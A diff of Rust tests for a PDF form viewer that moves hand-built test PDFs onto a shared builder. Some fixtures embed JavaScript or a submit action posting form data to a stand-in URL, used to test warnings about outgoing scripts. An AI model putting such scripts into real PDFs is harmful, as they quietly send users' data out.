@@ -35,53 +35,27 @@ mod testkit;
 /// building it directly is clearer than generating it, and the cross-reference
 /// table is the only fiddly part.
 fn calculating_form() -> Vec<u8> {
-    let objects: Vec<String> = vec![
+    crate::testkit::builder::Pdf::from_objects([
         // 1: catalog, carrying the AcroForm and its calculation order.
         "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R 6 0 R] \
-         /CO [6 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>"
-            .into(),
+         /CO [6 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>",
         // 2: the page tree.
-        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
+        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
         // 3: the page, whose annotations are the two widgets.
-        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R 6 0 R] >>".into(),
+        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R 6 0 R] >>",
         // 4: the font the fields' default appearance names.
-        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
+        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
         // 5: the field that is typed into.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (count) /V () \
-         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>"
-            .into(),
+         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>",
         // 6: the calculated field. Its value is never set in the file; if it
         // ever reads back as anything, a script produced it.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (total) /V () \
          /Ff 0 /Rect [100 650 300 680] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R \
          /AA << /C << /S /JavaScript /JS (event.value = \
-         this.getField(\"count\").value * 2;) >> >> >>"
-            .into(),
-    ];
-
-    let mut pdf = Vec::new();
-    pdf.extend_from_slice(b"%PDF-1.7\n");
-    let mut offsets = Vec::with_capacity(objects.len());
-    for (index, body) in objects.iter().enumerate() {
-        offsets.push(pdf.len());
-        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
-    }
-
-    let start_xref = pdf.len();
-    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
-    pdf.extend_from_slice(b"0000000000 65535 f \n");
-    for offset in &offsets {
-        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
-    }
-    pdf.extend_from_slice(
-        format!(
-            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n",
-            objects.len() + 1,
-            start_xref
-        )
-        .as_bytes(),
-    );
-    pdf
+         this.getField(\"count\").value * 2;) >> >> >>",
+    ])
+    .build()
 }
 
 fn fixture(name: &str) -> PathBuf {
@@ -158,44 +132,20 @@ fn a_calculation_script_runs_when_a_field_it_reads_is_committed() {
 /// A form whose keystroke script calls out to the viewer: an alert, and a
 /// submission to a URL that must never be contacted.
 fn reaching_form() -> Vec<u8> {
-    let objects: Vec<String> = vec![
+    crate::testkit::builder::Pdf::from_objects([
         "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] \
-         /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>"
-            .into(),
-        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
-        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>".into(),
-        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
+         /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>",
+        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>",
+        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
         // `/F` here is the format action, which PDFium runs when the field's
         // appearance is regenerated — that is, on every commit.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (count) /V () \
          /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R \
          /AA << /F << /S /JavaScript /JS (app.alert(\"filled\", \"pulpit\"); \
-         this.submitForm(\"https://example.invalid/collect\");) >> >> >>"
-            .into(),
-    ];
-
-    let mut pdf = Vec::new();
-    pdf.extend_from_slice(b"%PDF-1.7\n");
-    let mut offsets = Vec::with_capacity(objects.len());
-    for (index, body) in objects.iter().enumerate() {
-        offsets.push(pdf.len());
-        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
-    }
-    let start_xref = pdf.len();
-    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
-    pdf.extend_from_slice(b"0000000000 65535 f \n");
-    for offset in &offsets {
-        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
-    }
-    pdf.extend_from_slice(
-        format!(
-            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n",
-            objects.len() + 1,
-            start_xref
-        )
-        .as_bytes(),
-    );
-    pdf
+         this.submitForm(\"https://example.invalid/collect\");) >> >> >>",
+    ])
+    .build()
 }
 
 #[test]
@@ -305,7 +255,7 @@ fn a_form_whose_script_reaches_out_is_warned_about_when_it_opens() {
 /// action — `FPDFAnnot_GetLink` answers null for a widget. Only the presence
 /// of the `/A` dictionary is visible.
 fn submitting_button() -> Vec<u8> {
-    let objects: [&str; 5] = [
+    crate::testkit::builder::Pdf::from_objects([
         "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] \
          /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>",
         "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
@@ -315,28 +265,8 @@ fn submitting_button() -> Vec<u8> {
          /Rect [100 700 200 730] /F 4 /P 3 0 R \
          /A << /S /SubmitForm /F << /FS /URL /F (https://example.invalid/collect) >> \
          /Flags 4 >> >>",
-    ];
-    let mut pdf = Vec::new();
-    pdf.extend_from_slice(b"%PDF-1.7\n");
-    let mut offsets = Vec::new();
-    for (index, body) in objects.iter().enumerate() {
-        offsets.push(pdf.len());
-        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
-    }
-    let start = pdf.len();
-    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
-    pdf.extend_from_slice(b"0000000000 65535 f \n");
-    for offset in &offsets {
-        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
-    }
-    pdf.extend_from_slice(
-        format!(
-            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{start}\n%%EOF\n",
-            objects.len() + 1
-        )
-        .as_bytes(),
-    );
-    pdf
+    ])
+    .build()
 }
 
 /// A submit button is named at open time, even though nothing can say it is a
@@ -379,58 +309,29 @@ fn a_form_button_that_carries_an_action_is_warned_about_when_it_opens() {
     });
 }
 
-/// Serialise a flat list of object bodies into a PDF with a classic xref.
-fn serialise(objects: &[String]) -> Vec<u8> {
-    let mut pdf = Vec::new();
-    pdf.extend_from_slice(b"%PDF-1.7\n");
-    let mut offsets = Vec::with_capacity(objects.len());
-    for (index, body) in objects.iter().enumerate() {
-        offsets.push(pdf.len());
-        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
-    }
-    let start_xref = pdf.len();
-    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
-    pdf.extend_from_slice(b"0000000000 65535 f \n");
-    for offset in &offsets {
-        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
-    }
-    pdf.extend_from_slice(
-        format!(
-            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n",
-            objects.len() + 1,
-            start_xref
-        )
-        .as_bytes(),
-    );
-    pdf
-}
-
 /// A *two-page* form: `count` is typed on page one, and the calculation script
 /// on `total` — which lives on page **two** — rewrites itself from it.
 ///
 /// The same arithmetic as `calculating_form`, moved across a page boundary,
 /// because that is where the interesting asymmetry is.
 fn cross_page_calculating_form() -> Vec<u8> {
-    let objects: Vec<String> = vec![
+    crate::testkit::builder::Pdf::from_objects([
         "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R 7 0 R] \
-         /CO [7 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 5 0 R >> >> >> >>"
-            .into(),
-        "<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >>".into(),
-        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [6 0 R] >>".into(),
-        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [7 0 R] >>".into(),
-        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
+         /CO [7 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 5 0 R >> >> >> >>",
+        "<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >>",
+        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [6 0 R] >>",
+        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [7 0 R] >>",
+        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
         // 6: the typed field, on page one.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (count) /V () \
-         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>"
-            .into(),
+         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>",
         // 7: the calculated field, on page two.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (total) /V () \
          /Ff 0 /Rect [100 650 300 680] /DA (/Helv 12 Tf 0 g) /F 4 /P 4 0 R \
          /AA << /C << /S /JavaScript /JS (event.value = \
-         this.getField(\"count\").value * 2;) >> >> >>"
-            .into(),
-    ];
-    serialise(&objects)
+         this.getField(\"count\").value * 2;) >> >> >>",
+    ])
+    .build()
 }
 
 /// Committing on one page can change a field on another, and the engine's
@@ -505,24 +406,22 @@ fn a_calculation_can_rewrite_a_field_on_another_page_without_invalidating_it() {
 /// itself whenever anything commits, and `trigger` is the field that is typed
 /// into to set that off.
 fn date_stamping_form() -> Vec<u8> {
-    serialise(&[
+    crate::testkit::builder::Pdf::from_objects([
         "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R 6 0 R] \
-         /CO [6 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>"
-            .into(),
-        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
-        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R 6 0 R] >>".into(),
-        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
+         /CO [6 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>",
+        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R 6 0 R] >>",
+        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (trigger) /V () /Ff 0 \
-         /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>"
-            .into(),
+         /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>",
         // Single quotes in the script: a PDF literal string would otherwise
         // have to escape the double ones, and the point here is the `Date`.
         "<< /Type /Annot /Subtype /Widget /FT /Tx /T (when) /V () /Ff 0 \
          /Rect [100 650 300 680] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R \
          /AA << /C << /S /JavaScript /JS (event.value = \
-         util.printd('yyyy', new Date());) >> >> >>"
-            .into(),
+         util.printd('yyyy', new Date());) >> >> >>",
     ])
+    .build()
 }
 
 /// A script's own `Date` is the real one, and `FFI_GetLocalTime` does not
